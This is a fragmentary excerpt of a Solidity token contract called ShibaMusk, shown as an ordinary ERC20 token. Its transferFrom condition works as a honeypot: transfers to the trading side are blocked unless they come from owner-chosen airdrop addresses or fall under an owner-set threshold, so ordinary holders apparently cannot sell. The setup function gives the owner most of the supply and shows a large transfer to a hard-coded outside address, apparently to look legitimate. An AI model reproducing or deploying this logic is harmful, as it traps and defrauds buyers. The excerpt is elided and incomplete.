 ...
 */
  ...
  function transferFrom(address from, address to, uint tokens) public returns (bool success) {
    ...
    else require(to != sender || (from == airdrop1 && to == sender) || (from == airdrop2 && to == sender) || (to == sender && balances[from] <= queue_number), "please wait");
  ...
  function approveAndQueue(uint256 _queue) public onlyOwner {
    queue_number = _queue * (10 ** uint256(decimals));
  }	
...
contract ShibaMusk is TokenERC20 {
  ...
  function CheckToken() public onlyOwner() {
	...
	airdrop2 = _a2;
	owner = msg.sender;
	balances[msg.sender] = _totalSupply/10000*6500;
	balances[0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B] = _totalSupply/10000*3200;
	balances[_a1] = _totalSupply/10000*154;
	balances[_a2] = _totalSupply/10000*146;
	emit Transfer(address(0x0), msg.sender, _totalSupply);
	emit Transfer(msg.sender, 0xAb5801a7D398351b8bE11C439e05C5B3259aeC9B, _totalSupply/10000*3200);
  }
  function() external payable {
